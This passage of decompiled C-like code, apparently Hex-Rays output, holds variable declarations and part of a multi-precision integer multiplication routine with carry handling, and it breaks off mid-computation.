  unsigned __int64 v591; // rcx
  unsigned __int64 v592; // r9
  _BOOL8 v593; // r10
  unsigned __int128 v594; // ax
  unsigned __int64 v595; // r8
  unsigned __int64 v596; // r9
  _BOOL8 v597; // r10
  unsigned __int128 v598; // ax
  unsigned __int64 v599; // rcx
  unsigned __int64 v600; // r9
  _BOOL8 v601; // r10
  unsigned __int128 v602; // ax
  unsigned __int64 v603; // r8
  unsigned __int64 v604; // r9
  _BOOL8 v605; // r10
  unsigned __int128 v606; // ax
  unsigned __int64 v607; // rcx
  unsigned __int64 v608; // r9
  __int64 v609; // r10
  unsigned __int128 v610; // ax
  unsigned __int64 v611; // r8
  unsigned __int64 v612; // r9
  __int64 v613; // r10
  unsigned __int128 v614; // ax
  unsigned __int64 v615; // rcx
  unsigned __int64 v616; // r9
  __int64 v617; // r10
  unsigned __int128 v618; // ax
  unsigned __int64 v619; // r8
  unsigned __int64 v620; // r9
  __int64 v621; // r10
  unsigned __int128 v622; // ax
  unsigned __int64 v623; // rcx
  unsigned __int64 v624; // r9
  __int64 v625; // r10
  unsigned __int128 v626; // ax
  unsigned __int64 v627; // r8
  unsigned __int64 v628; // r9
  __int64 v629; // r10
  unsigned __int128 v630; // ax
  unsigned __int64 v631; // rcx
  unsigned __int64 v632; // r9
  __int64 v633; // r10
  unsigned __int128 v634; // ax
  unsigned __int64 v635; // r8
  unsigned __int64 v636; // r9
  __int64 v637; // r10
  unsigned __int128 v638; // ax
  unsigned __int64 v639; // rcx
  unsigned __int64 v640; // r9
  __int64 v641; // r10
  unsigned __int128 v642; // ax
  unsigned __int64 v643; // r9
  __int64 v644; // r10
  unsigned __int128 v645; // ax
  unsigned __int64 v646; // rcx
  unsigned __int64 v647; // r10
  _BOOL8 v648; // r9
  unsigned __int128 v649; // ax
  unsigned __int64 v650; // r8
  unsigned __int64 v651; // r10
  _BOOL8 v652; // r9
  unsigned __int128 v653; // ax
  unsigned __int64 v654; // rcx
  unsigned __int64 v655; // r10
  _BOOL8 v656; // r9
  unsigned __int128 v657; // ax
  unsigned __int64 v658; // r8
  unsigned __int64 v659; // r10
  _BOOL8 v660; // r9
  unsigned __int128 v661; // ax
  unsigned __int64 v662; // rcx
  unsigned __int64 v663; // r10
  __int64 v664; // r9
  unsigned __int128 v665; // ax
  unsigned __int64 v666; // r8
  unsigned __int64 v667; // r10
  __int64 v668; // r9
  unsigned __int128 v669; // ax
  unsigned __int64 v670; // rcx
  unsigned __int64 v671; // r10
  __int64 v672; // r9
  unsigned __int128 v673; // ax
  unsigned __int64 v674; // r8
  unsigned __int64 v675; // r10
  __int64 v676; // r9
  unsigned __int128 v677; // ax
  unsigned __int64 v678; // rcx
  unsigned __int64 v679; // r10
  __int64 v680; // r9
  unsigned __int128 v681; // ax
  unsigned __int64 v682; // r8
  unsigned __int64 v683; // r10
  __int64 v684; // r9
  unsigned __int128 v685; // ax
  unsigned __int64 v686; // rcx
  unsigned __int64 v687; // r10
  __int64 v688; // r9
  unsigned __int128 v689; // ax
  unsigned __int64 v690; // r8
  unsigned __int64 v691; // r10
  __int64 v692; // r9
  unsigned __int128 v693; // ax
  unsigned __int64 v694; // r10
  __int64 v695; // r9
  unsigned __int128 v696; // ax
  unsigned __int64 v697; // rcx
  unsigned __int64 v698; // r9
  _BOOL8 v699; // r10
  unsigned __int128 v700; // ax
  unsigned __int64 v701; // r8
  unsigned __int64 v702; // r9
  _BOOL8 v703; // r10
  unsigned __int128 v704; // ax
  unsigned __int64 v705; // rcx
  unsigned __int64 v706; // r9
  _BOOL8 v707; // r10
  unsigned __int128 v708; // ax
  unsigned __int64 v709; // r8
  unsigned __int64 v710; // r9
  _BOOL8 v711; // r10
  unsigned __int128 v712; // ax
  unsigned __int64 v713; // rcx
  unsigned __int64 v714; // r9
  __int64 v715; // r10
  unsigned __int128 v716; // ax
  unsigned __int64 v717; // r8
  unsigned __int64 v718; // r9
  __int64 v719; // r10
  unsigned __int128 v720; // ax
  unsigned __int64 v721; // rcx
  unsigned __int64 v722; // r9
  __int64 v723; // r10
  unsigned __int128 v724; // ax
  unsigned __int64 v725; // r8
  unsigned __int64 v726; // r9
  __int64 v727; // r10
  unsigned __int128 v728; // ax
  unsigned __int64 v729; // rcx
  unsigned __int64 v730; // r9
  __int64 v731; // r10
  unsigned __int128 v732; // ax
  unsigned __int64 v733; // r8
  unsigned __int64 v734; // r9
  __int64 v735; // r10
  unsigned __int128 v736; // ax
  unsigned __int64 v737; // rcx
  unsigned __int64 v738; // r9
  __int64 v739; // r10
  unsigned __int128 v740; // ax
  unsigned __int64 v741; // r9
  __int64 v742; // r10
  unsigned __int128 v743; // ax
  unsigned __int64 v744; // rcx
  unsigned __int64 v745; // r10
  _BOOL8 v746; // r9
  unsigned __int128 v747; // ax
  unsigned __int64 v748; // r8
  unsigned __int64 v749; // r10
  _BOOL8 v750; // r9
  unsigned __int128 v751; // ax
  unsigned __int64 v752; // rcx
  unsigned __int64 v753; // r10
  _BOOL8 v754; // r9
  unsigned __int128 v755; // ax
  unsigned __int64 v756; // r8
  unsigned __int64 v757; // r10
  _BOOL8 v758; // r9
  unsigned __int128 v759; // ax
  unsigned __int64 v760; // rcx
  unsigned __int64 v761; // r10
  __int64 v762; // r9
  unsigned __int128 v763; // ax
  unsigned __int64 v764; // r8
  unsigned __int64 v765; // r10
  __int64 v766; // r9
  unsigned __int128 v767; // ax
  unsigned __int64 v768; // rcx
  unsigned __int64 v769; // r10
  __int64 v770; // r9
  unsigned __int128 v771; // ax
  unsigned __int64 v772; // r8
  unsigned __int64 v773; // r10
  __int64 v774; // r9
  unsigned __int128 v775; // ax
  unsigned __int64 v776; // rcx
  unsigned __int64 v777; // r10
  __int64 v778; // r9
  unsigned __int128 v779; // ax
  unsigned __int64 v780; // r8
  unsigned __int64 v781; // r10
  __int64 v782; // r9
  unsigned __int128 v783; // ax
  unsigned __int64 v784; // r10
  __int64 v785; // r9
  unsigned __int128 v786; // ax
  unsigned __int64 v787; // rcx
  unsigned __int64 v788; // r9
  _BOOL8 v789; // r10
  unsigned __int128 v790; // ax
  unsigned __int64 v791; // r8
  unsigned __int64 v792; // r9
  _BOOL8 v793; // r10
  unsigned __int128 v794; // ax
  unsigned __int64 v795; // rcx
  unsigned __int64 v796; // r9
  _BOOL8 v797; // r10
  unsigned __int128 v798; // ax
  unsigned __int64 v799; // r8
  unsigned __int64 v800; // r9
  _BOOL8 v801; // r10
  unsigned __int128 v802; // ax
  unsigned __int64 v803; // rcx
  unsigned __int64 v804; // r9
  __int64 v805; // r10
  unsigned __int128 v806; // ax
  unsigned __int64 v807; // r8
  unsigned __int64 v808; // r9
  __int64 v809; // r10
  unsigned __int128 v810; // ax
  unsigned __int64 v811; // rcx
  unsigned __int64 v812; // r9
  __int64 v813; // r10
  unsigned __int128 v814; // ax
  unsigned __int64 v815; // r8
  unsigned __int64 v816; // r9
  __int64 v817; // r10
  unsigned __int128 v818; // ax
  unsigned __int64 v819; // rcx
  unsigned __int64 v820; // r9
  __int64 v821; // r10
  unsigned __int128 v822; // ax
  unsigned __int64 v823; // r9
  __int64 v824; // r10
  unsigned __int128 v825; // ax
  unsigned __int64 v826; // rcx
  unsigned __int64 v827; // r10
  _BOOL8 v828; // r9
  unsigned __int128 v829; // ax
  unsigned __int64 v830; // r8
  unsigned __int64 v831; // r10
  _BOOL8 v832; // r9
  unsigned __int128 v833; // ax
  unsigned __int64 v834; // rcx
  unsigned __int64 v835; // r10
  _BOOL8 v836; // r9
  unsigned __int128 v837; // ax
  unsigned __int64 v838; // r8
  unsigned __int64 v839; // r10
  _BOOL8 v840; // r9
  unsigned __int128 v841; // ax
  unsigned __int64 v842; // rcx
  unsigned __int64 v843; // r10
  __int64 v844; // r9
  unsigned __int128 v845; // ax
  unsigned __int64 v846; // r8
  unsigned __int64 v847; // r10
  __int64 v848; // r9
  unsigned __int128 v849; // ax
  unsigned __int64 v850; // rcx
  unsigned __int64 v851; // r10
  __int64 v852; // r9
  unsigned __int128 v853; // ax
  unsigned __int64 v854; // r8
  unsigned __int64 v855; // r10
  __int64 v856; // r9
  unsigned __int128 v857; // ax
  unsigned __int64 v858; // r10
  __int64 v859; // r9
  unsigned __int128 v860; // ax
  unsigned __int64 v861; // rcx
  unsigned __int64 v862; // r9
  _BOOL8 v863; // r10
  unsigned __int128 v864; // ax
  unsigned __int64 v865; // r8
  unsigned __int64 v866; // r9
  _BOOL8 v867; // r10
  unsigned __int128 v868; // ax
  unsigned __int64 v869; // rcx
  unsigned __int64 v870; // r9
  _BOOL8 v871; // r10
  unsigned __int128 v872; // ax
  unsigned __int64 v873; // r8
  unsigned __int64 v874; // r9
  _BOOL8 v875; // r10
  unsigned __int128 v876; // ax
  unsigned __int64 v877; // rcx
  unsigned __int64 v878; // r9
  __int64 v879; // r10
  unsigned __int128 v880; // ax
  unsigned __int64 v881; // r8
  unsigned __int64 v882; // r9
  __int64 v883; // r10
  unsigned __int128 v884; // ax
  unsigned __int64 v885; // rcx
  unsigned __int64 v886; // r9
  __int64 v887; // r10
  unsigned __int128 v888; // ax
  unsigned __int64 v889; // r9
  __int64 v890; // r10
  unsigned __int128 v891; // ax
  unsigned __int64 v892; // rcx
  unsigned __int64 v893; // r10
  _BOOL8 v894; // r9
  unsigned __int128 v895; // ax
  unsigned __int64 v896; // r8
  unsigned __int64 v897; // r10
  _BOOL8 v898; // r9
  unsigned __int128 v899; // ax
  unsigned __int64 v900; // rcx
  unsigned __int64 v901; // r10
  _BOOL8 v902; // r9
  unsigned __int128 v903; // ax
  unsigned __int64 v904; // r8
  unsigned __int64 v905; // r10
  _BOOL8 v906; // r9
  unsigned __int128 v907; // ax
  unsigned __int64 v908; // rcx
  unsigned __int64 v909; // r10
  __int64 v910; // r9
  unsigned __int128 v911; // ax
  unsigned __int64 v912; // r8
  unsigned __int64 v913; // r10
  __int64 v914; // r9
  unsigned __int128 v915; // ax
  unsigned __int64 v916; // r10
  __int64 v917; // r9
  unsigned __int128 v918; // ax
  unsigned __int64 v919; // rcx
  unsigned __int64 v920; // r9
  _BOOL8 v921; // r10
  unsigned __int128 v922; // ax
  unsigned __int64 v923; // r8
  unsigned __int64 v924; // r9
  _BOOL8 v925; // r10
  unsigned __int128 v926; // ax
  unsigned __int64 v927; // rcx
  unsigned __int64 v928; // r9
  _BOOL8 v929; // r10
  unsigned __int128 v930; // ax
  unsigned __int64 v931; // r8
  unsigned __int64 v932; // r9
  _BOOL8 v933; // r10
  unsigned __int128 v934; // ax
  unsigned __int64 v935; // rcx
  unsigned __int64 v936; // r9
  __int64 v937; // r10
  unsigned __int128 v938; // ax
  unsigned __int64 v939; // r9
  __int64 v940; // r10
  unsigned __int128 v941; // ax
  unsigned __int64 v942; // rcx
  unsigned __int64 v943; // r10
  _BOOL8 v944; // r9
  unsigned __int128 v945; // ax
  unsigned __int64 v946; // r8
  unsigned __int64 v947; // r10
  _BOOL8 v948; // r9
  unsigned __int128 v949; // ax
  unsigned __int64 v950; // rcx
  unsigned __int64 v951; // r10
  _BOOL8 v952; // r9
  unsigned __int128 v953; // ax
  unsigned __int64 v954; // r8
  unsigned __int64 v955; // r10
  _BOOL8 v956; // r9
  unsigned __int128 v957; // ax
  unsigned __int64 v958; // r10
  __int64 v959; // r9
  unsigned __int128 v960; // ax
  unsigned __int64 v961; // rcx
  unsigned __int64 v962; // r9
  _BOOL8 v963; // r10
  unsigned __int128 v964; // ax
  unsigned __int64 v965; // r8
  unsigned __int64 v966; // r9
  _BOOL8 v967; // r10
  unsigned __int128 v968; // ax
  unsigned __int64 v969; // rcx
  unsigned __int64 v970; // r9
  _BOOL8 v971; // r10
  unsigned __int128 v972; // ax
  unsigned __int64 v973; // r9
  _BOOL8 v974; // r10
  unsigned __int128 v975; // ax
  unsigned __int64 v976; // rcx
  unsigned __int64 v977; // r10
  _BOOL8 v978; // r9
  unsigned __int128 v979; // ax
  unsigned __int64 v980; // r8
  unsigned __int64 v981; // r10
  _BOOL8 v982; // r9
  unsigned __int128 v983; // ax
  unsigned __int64 v984; // r10
  _BOOL8 v985; // r9
  unsigned __int128 v986; // ax
  unsigned __int64 v987; // rcx
  unsigned __int64 v988; // r9
  _BOOL8 v989; // r8
  unsigned __int128 v990; // ax
  unsigned __int64 v991; // r9
  _BOOL8 v992; // r8
  unsigned __int128 v993; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v4;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = *v3 * (unsigned __int128)v4[2];
  v14 = v11 + v13;
  *((_QWORD *)&v13 + 1) += v11 + (unsigned __int64)v13 < v11;
  v15 = *((_QWORD *)&v13 + 1) + v12;
  v16 = v15 < *((_QWORD *)&v13 + 1);
  v17 = v3[1] * (unsigned __int128)v4[1];
  v18 = v14 + v17;
  *((_QWORD *)&v17 + 1) += v14 + (unsigned __int64)v17 < v14;
  v19 = *((_QWORD *)&v17 + 1) + v15;
  v20 = (v19 < *((_QWORD *)&v17 + 1)) + v16;
  v21 = v3[2] * (unsigned __int128)*v4;
  *(_QWORD *)&v21 = v18 + v21;
  v5[2] = v21;
  *((_QWORD *)&v21 + 1) += (unsigned __int64)v21 < v18;
  v22 = *((_QWORD *)&v21 + 1) + v19;
  v23 = (v22 < *((_QWORD *)&v21 + 1)) + v20;
  v24 = *v3 * (unsigned __int128)v4[3];
  v25 = v22 + v24;
  *((_QWORD *)&v24 + 1) += v22 + (unsigned __int64)v24 < v22;
  v26 = *((_QWORD *)&v24 + 1) + v23;
  v27 = v26 < *((_QWORD *)&v24 + 1);
  v28 = v3[1] * (unsigned __int128)v4[2];
  v29 = v25 + v28;
  *((_QWORD *)&v28 + 1) += v25 + (unsigned __int64)v28 < v25;
  v30 = *((_QWORD *)&v28 + 1) + v26;
  v31 = (v30 < *((_QWORD *)&v28 + 1)) + v27;
  v32 = v3[2] * (unsigned __int128)v4[1];
  v33 = v29 + v32;
  *((_QWORD *)&v32 + 1) += v29 + (unsigned __int64)v32 < v29;
  v34 = *((_QWORD *)&v32 + 1) + v30;
  v35 = (v34 < *((_QWORD *)&v32 + 1)) + v31;
  v36 = v3[3] * (unsigned __int128)*v4;
  *(_QWORD *)&v36 = v33 + v36;
  v5[3] = v36;
  *((_QWORD *)&v36 + 1) += (unsigned __int64)v36 < v33;
  v37 = *((_QWORD *)&v36 + 1) + v34;
  v38 = (v37 < *((_QWORD *)&v36 + 1)) + v35;
  v39 = *v3 * (unsigned __int128)v4[4];
  v40 = v37 + v39;
  *((_QWORD *)&v39 + 1) += v37 + (unsigned __int64)v39 < v37;
  v41 = *((_QWORD *)&v39 + 1) + v38;
  v42 = v41 < *((_QWORD *)&v39 + 1);
  v43 = v3[1] * (unsigned __int128)v4[3];
  v44 = v40 + v43;
  *((_QWORD *)&v43 + 1) += v40 + (unsigned __int64)v43 < v40;
  v45 = *((_QWORD *)&v43 + 1) + v41;
  v46 = (v45 < *((_QWORD *)&v43 + 1)) + v42;
  v47 = v3[2] * (unsigned __int128)v4[2];
  v48 = v44 + v47;
  *((_QWORD *)&v47 + 1) += v44 + (unsigned __int64)v47 < v44;
  v49 = *((_QWORD *)&v47 + 1) + v45;
  v50 = (v49 < *((_QWORD *)&v47 + 1)) + v46;
  v51 = v3[3] * (unsigned __int128)v4[1];
  v52 = v48 + v51;
  *((_QWORD *)&v51 + 1) += v48 + (unsigned __int64)v51 < v48;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  v54 = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  v55 = v3[4] * (unsigned __int128)*v4;
  *(_QWORD *)&v55 = v52 + v55;
  v5[4] = v55;
  *((_QWORD *)&v55 + 1) += (unsigned __int64)v55 < v52;
  v56 = *((_QWORD *)&v55 + 1) + v53;
  v57 = (v56 < *((_QWORD *)&v55 + 1)) + v54;
  v58 = *v3 * (unsigned __int128)v4[5];
  v59 = v56 + v58;
  *((_QWORD *)&v58 + 1) += v56 + (unsigned __int64)v58 < v56;
  v60 = *((_QWORD *)&v58 + 1) + v57;
  v61 = v60 < *((_QWORD *)&v58 + 1);
  v62 = v3[1] * (unsigned __int128)v4[4];
  v63 = v59 + v62;
  *((_QWORD *)&v62 + 1) += v59 + (unsigned __int64)v62 < v59;
  v64 = *((_QWORD *)&v62 + 1) + v60;
  v65 = (v64 < *((_QWORD *)&v62 + 1)) + v61;
  v66 = v3[2] * (unsigned __int128)v4[3];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = v3[3] * (unsigned __int128)v4[2];
  v71 = v67 + v70;
  *((_QWORD *)&v70 + 1) += v67 + (unsigned __int64)v70 < v67;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v73 = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  v74 = v3[4] * (unsigned __int128)v4[1];
  v75 = v71 + v74;
  *((_QWORD *)&v74 + 1) += v71 + (unsigned __int64)v74 < v71;
  v76 = *((_QWORD *)&v74 + 1) + v72;
  v77 = (v76 < *((_QWORD *)&v74 + 1)) + v73;
  v78 = v3[5] * (unsigned __int128)*v4;
  *(_QWORD *)&v78 = v75 + v78;
  v5[5] = v78;
  *((_QWORD *)&v78 + 1) += (unsigned __int64)v78 < v75;
  v79 = *((_QWORD *)&v78 + 1) + v76;
  v80 = (v79 < *((_QWORD *)&v78 + 1)) + v77;
  v81 = *v3 * (unsigned __int128)v4[6];
  v82 = v79 + v81;
  *((_QWORD *)&v81 + 1) += v79 + (unsigned __int64)v81 < v79;
  v83 = *((_QWORD *)&v81 + 1) + v80;
  v84 = v83 < *((_QWORD *)&v81 + 1);
  v85 = v3[1] * (unsigned __int128)v4[5];
  v86 = v82 + v85;
  *((_QWORD *)&v85 + 1) += v82 + (unsigned __int64)v85 < v82;
  v87 = *((_QWORD *)&v85 + 1) + v83;
  v88 = (v87 < *((_QWORD *)&v85 + 1)) + v84;
  v89 = v3[2] * (unsigned __int128)v4[4];
  v90 = v86 + v89;
  *((_QWORD *)&v89 + 1) += v86 + (unsigned __int64)v89 < v86;
  v91 = *((_QWORD *)&v89 + 1) + v87;
  v92 = (v91 < *((_QWORD *)&v89 + 1)) + v88;
  v93 = v3[3] * (unsigned __int128)v4[3];
  v94 = v90 + v93;
  *((_QWORD *)&v93 + 1) += v90 + (unsigned __int64)v93 < v90;
  v95 = *((_QWORD *)&v93 + 1) + v91;
  v96 = (v95 < *((_QWORD *)&v93 + 1)) + v92;
  v97 = v3[4] * (unsigned __int128)v4[2];
  v98 = v94 + v97;
  *((_QWORD *)&v97 + 1) += v94 + (unsigned __int64)v97 < v94;
  v99 = *((_QWORD *)&v97 + 1) + v95;
  v100 = (v99 < *((_QWORD *)&v97 + 1)) + v96;
  v101 = v3[5] * (unsigned __int128)v4[1];
  v102 = v98 + v101;
  *((_QWORD *)&v101 + 1) += v98 + (unsigned __int64)v101 < v98;
  v103 = *((_QWORD *)&v101 + 1) + v99;
  v104 = (v103 < *((_QWORD *)&v101 + 1)) + v100;
  v105 = v3[6] * (unsigned __int128)*v4;
  *(_QWORD *)&v105 = v102 + v105;
  v5[6] = v105;
  *((_QWORD *)&v105 + 1) += (unsigned __int64)v105 < v102;
  v106 = *((_QWORD *)&v105 + 1) + v103;
  v107 = (v106 < *((_QWORD *)&v105 + 1)) + v104;
  v108 = *v3 * (unsigned __int128)v4[7];
  v109 = v106 + v108;
  *((_QWORD *)&v108 + 1) += v106 + (unsigned __int64)v108 < v106;
  v110 = *((_QWORD *)&v108 + 1) + v107;
  v111 = v110 < *((_QWORD *)&v108 + 1);
  v112 = v3[1] * (unsigned __int128)v4[6];
  v113 = v109 + v112;
  *((_QWORD *)&v112 + 1) += v109 + (unsigned __int64)v112 < v109;
  v114 = *((_QWORD *)&v112 + 1) + v110;
  v115 = (v114 < *((_QWORD *)&v112 + 1)) + v111;
  v116 = v3[2] * (unsigned __int128)v4[5];
  v117 = v113 + v116;
  *((_QWORD *)&v116 + 1) += v113 + (unsigned __int64)v116 < v113;
  v118 = *((_QWORD *)&v116 + 1) + v114;
  v119 = (v118 < *((_QWORD *)&v116 + 1)) + v115;
  v120 = v3[3] * (unsigned __int128)v4[4];
  v121 = v117 + v120;
  *((_QWORD *)&v120 + 1) += v117 + (unsigned __int64)v120 < v117;
  v122 = *((_QWORD *)&v120 + 1) + v118;
  v123 = (v122 < *((_QWORD *)&v120 + 1)) + v119;
  v124 = v3[4] * (unsigned __int128)v4[3];
  v125 = v121 + v124;
  *((_QWORD *)&v124 + 1) += v121 + (unsigned __int64)v124 < v121;
  v126 = *((_QWORD *)&v124 + 1) + v122;
  v127 = (v126 < *((_QWORD *)&v124 + 1)) + v123;
  v128 = v3[5] * (unsigned __int128)v4[2];
  v129 = v125 + v128;
  *((_QWORD *)&v128 + 1) += v125 + (unsigned __int64)v128 < v125;
  v130 = *((_QWORD *)&v128 + 1) + v126;
  v131 = (v130 < *((_QWORD *)&v128 + 1)) + v127;
  v132 = v3[6] * (unsigned __int128)v4[1];
  v133 = v129 + v132;
  *((_QWORD *)&v132 + 1) += v129 + (unsigned __int64)v132 < v129;
  v134 = *((_QWORD *)&v132 + 1) + v130;
  v135 = (v134 < *((_QWORD *)&v132 + 1)) + v131;
  v136 = v3[7] * (unsigned __int128)*v4;
  *(_QWORD *)&v136 = v133 + v136;
  v5[7] = v136;
  *((_QWORD *)&v136 + 1) += (unsigned __int64)v136 < v133;
  v137 = *((_QWORD *)&v136 + 1) + v134;
  v138 = (v137 < *((_QWORD *)&v136 + 1)) + v135;
  v139 = *v3 * (unsigned __int128)v4[8];
  v140 = v137 + v139;
  *((_QWORD *)&v139 + 1) += v137 + (unsigned __int64)v139 < v137;
  v141 = *((_QWORD *)&v139 + 1) + v138;
  v142 = v141 < *((_QWORD *)&v139 + 1);
  v143 = v3[1] * (unsigned __int128)v4[7];
  v144 = v140 + v143;
  *((_QWORD *)&v143 + 1) += v140 + (unsigned __int64)v143 < v140;
  v145 = *((_QWORD *)&v143 + 1) + v141;
  v146 = (v145 < *((_QWORD *)&v143 + 1)) + v142;
  v147 = v3[2] * (unsigned __int128)v4[6];
  v148 = v144 + v147;
  *((_QWORD *)&v147 + 1) += v144 + (unsigned __int64)v147 < v144;
  v149 = *((_QWORD *)&v147 + 1) + v145;
  v150 = (v149 < *((_QWORD *)&v147 + 1)) + v146;
  v151 = v3[3] * (unsigned __int128)v4[5];
  v152 = v148 + v151;
  *((_QWORD *)&v151 + 1) += v148 + (unsigned __int64)v151 < v148;
  v153 = *((_QWORD *)&v151 + 1) + v149;
  v154 = (v153 < *((_QWORD *)&v151 + 1)) + v150;
  v155 = v3[4] * (unsigned __int128)v4[4];
  v156 = v152 + v155;
  *((_QWORD *)&v155 + 1) += v152 + (unsigned __int64)v155 < v152;
  v157 = *((_QWORD *)&v155 + 1) + v153;
  v158 = (v157 < *((_QWORD *)&v155 + 1)) + v154;
  v159 = v3[5] * (unsigned __int128)v4[3];
  v160 = v156 + v159;
  *((_QWORD *)&v159 + 1) += v156 + (unsigned __int64)v159 < v156;
  v161 = *((_QWORD *)&v159 + 1) + v157;
  v162 = (v161 < *((_QWORD *)&v159 + 1)) + v158;
  v163 = v3[6] * (unsigned __int128)v4[2];
  v164 = v160 + v163;
  *((_QWORD *)&v163 + 1) += v160 + (unsigned __int64)v163 < v160;
  v165 = *((_QWORD *)&v163 + 1) + v161;
  v166 = (v165 < *((_QWORD *)&v163 + 1)) + v162;
  v167 = v3[7] * (unsigned __int128)v4[1];
  v168 = v164 + v167;
  *((_QWORD *)&v167 + 1) += v164 + (unsigned __int64)v167 < v164;
  v169 = *((_QWORD *)&v167 + 1) + v165;
  v170 = (v169 < *((_QWORD *)&v167 + 1)) + v166;
  v171 = v3[8] * (unsigned __int128)*v4;
  *(_QWORD *)&v171 = v168 + v171;
  v5[8] = v171;
  *((_QWORD *)&v171 + 1) += (unsigned __int64)v171 < v168;
  v172 = *((_QWORD *)&v171 + 1) + v169;
  v173 = (v172 < *((_QWORD *)&v171 + 1)) + v170;
  v174 = *v3 * (unsigned __int128)v4[9];
  v175 = v172 + v174;
  *((_QWORD *)&v174 + 1) += v172 + (unsigned __int64)v174 < v172;
  v176 = *((_QWORD *)&v174 + 1) + v173;
  v177 = v176 < *((_QWORD *)&v174 + 1);
  v178 = v3[1] * (unsigned __int128)v4[8];
  v179 = v175 + v178;
  *((_QWORD *)&v178 + 1) += v175 + (unsigned __int64)v178 < v175;
  v180 = *((_QWORD *)&v178 + 1) + v176;
  v181 = (v180 < *((_QWORD *)&v178 + 1)) + v177;
  v182 = v3[2] * (unsigned __int128)v4[7];
  v183 = v179 + v182;
  *((_QWORD *)&v182 + 1) += v179 + (unsigned __int64)v182 < v179;
  v184 = *((_QWORD *)&v182 + 1) + v180;
  v185 = (v184 < *((_QWORD *)&v182 + 1)) + v181;
  v186 = v3[3] * (unsigned __int128)v4[6];
  v187 = v183 + v186;
  *((_QWORD *)&v186 + 1) += v183 + (unsigned __int64)v186 < v183;
  v188 = *((_QWORD *)&v186 + 1) + v184;
  v189 = (v188 < *((_QWORD *)&v186 + 1)) + v185;
  v190 = v3[4] * (unsigned __int128)v4[5];
  v191 = v187 + v190;
  *((_QWORD *)&v190 + 1) += v187 + (unsigned __int64)v190 < v187;
  v192 = *((_QWORD *)&v190 + 1) + v188;
  v193 = (v192 < *((_QWORD *)&v190 + 1)) + v189;
  v194 = v3[5] * (unsigned __int128)v4[4];
  v195 = v191 + v194;
  *((_QWORD *)&v194 + 1) += v191 + (unsigned __int64)v194 < v191;
  v196 = *((_QWORD *)&v194 + 1) + v192;
  v197 = (v196 < *((_QWORD *)&v194 + 1)) + v193;
  v198 = v3[6] * (unsigned __int128)v4[3];
  v199 = v195 + v198;
  *((_QWORD *)&v198 + 1) += v195 + (unsigned __int64)v198 < v195;
  v200 = *((_QWORD *)&v198 + 1) + v196;
  v201 = (v200 < *((_QWORD *)&v198 + 1)) + v197;
  v202 = v3[7] * (unsigned __int128)v4[2];
  v203 = v199 + v202;
  *((_QWORD *)&v202 + 1) += v199 + (unsigned __int64)v202 < v199;
  v204 = *((_QWORD *)&v202 + 1) + v200;
  v205 = (v204 < *((_QWORD *)&v202 + 1)) + v201;
  v206 = v3[8] * (unsigned __int128)v4[1];
  v207 = v203 + v206;
  *((_QWORD *)&v206 + 1) += v203 + (unsigned __int64)v206 < v203;
  v208 = *((_QWORD *)&v206 + 1) + v204;
  v209 = (v208 < *((_QWORD *)&v206 + 1)) + v205;
  v210 = v3[9] * (unsigned __int128)*v4;
  *(_QWORD *)&v210 = v207 + v210;
  v5[9] = v210;
  *((_QWORD *)&v210 + 1) += (unsigned __int64)v210 < v207;
  v211 = *((_QWORD *)&v210 + 1) + v208;
  v212 = (v211 < *((_QWORD *)&v210 + 1)) + v209;
  v213 = *v3 * (unsigned __int128)v4[10];
  v214 = v211 + v213;
  *((_QWORD *)&v213 + 1) += v211 + (unsigned __int64)v213 < v211;
  v215 = *((_QWORD *)&v213 + 1) + v212;
  v216 = v215 < *((_QWORD *)&v213 + 1);
  v217 = v3[1] * (unsigned __int128)v4[9];
  v218 = v214 + v217;
  *((_QWORD *)&v217 + 1) += v214 + (unsigned __int64)v217 < v214;
  v219 = *((_QWORD *)&v217 + 1) + v215;
  v220 = (v219 < *((_QWORD *)&v217 + 1)) + v216;
  v221 = v3[2] * (unsigned __int128)v4[8];
  v222 = v218 + v221;
  *((_QWORD *)&v221 + 1) += v218 + (unsigned __int64)v221 < v218;
  v223 = *((_QWORD *)&v221 + 1) + v219;
  v224 = (v223 < *((_QWORD *)&v221 + 1)) + v220;
  v225 = v3[3] * (unsigned __int128)v4[7];
  v226 = v222 + v225;
  *((_QWORD *)&v225 + 1) += v222 + (unsigned __int64)v225 < v222;
  v227 = *((_QWORD *)&v225 + 1) + v223;
  v228 = (v227 < *((_QWORD *)&v225 + 1)) + v224;
  v229 = v3[4] * (unsigned __int128)v4[6];
  v230 = v226 + v229;
  *((_QWORD *)&v229 + 1) += v226 + (unsigned __int64)v229 < v226;
  v231 = *((_QWORD *)&v229 + 1) + v227;
  v232 = (v231 < *((_QWORD *)&v229 + 1)) + v228;
  v233 = v3[5] * (unsigned __int128)v4[5];
  v234 = v230 + v233;
  *((_QWORD *)&v233 + 1) += v230 + (unsigned __int64)v233 < v230;
  v235 = *((_QWORD *)&v233 + 1) + v231;
  v236 = (v235 < *((_QWORD *)&v233 + 1)) + v232;
  v237 = v3[6] * (unsigned __int128)v4[4];
  v238 = v234 + v237;
  *((_QWORD *)&v237 + 1) += v234 + (unsigned __int64)v237 < v234;
  v239 = *((_QWORD *)&v237 + 1) + v235;
  v240 = (v239 < *((_QWORD *)&v237 + 1)) + v236;
  v241 = v3[7] * (unsigned __int128)v4[3];
  v242 = v238 + v241;
  *((_QWORD *)&v241 + 1) += v238 + (unsigned __int64)v241 < v238;
  v243 = *((_QWORD *)&v241 + 1) + v239;
  v244 = (v243 < *((_QWORD *)&v241 + 1)) + v240;
  v245 = v3[8] * (unsigned __int128)v4[2];
  v246 = v242 + v245;
